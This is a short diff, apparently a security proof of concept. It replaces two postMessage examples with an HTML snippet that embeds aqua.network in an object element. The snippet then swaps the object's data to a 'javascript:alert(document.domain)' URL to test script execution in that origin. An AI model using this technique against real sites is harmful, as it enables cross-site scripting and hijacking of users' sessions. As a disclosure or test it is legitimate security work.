@@ -1,3 +1,4 @@
-window.postMessage({type:"CONNECT"}, "*") 
-// vs
-window.postMessage({type:"CONNECT"}, "https://aqua.network")
+<object data="https://aqua.network"></object>
+<script>
+setTimeout(()=>{ document.querySelector('object').data = 'javascript:alert(document.domain)'; }, 2000)
+</script>
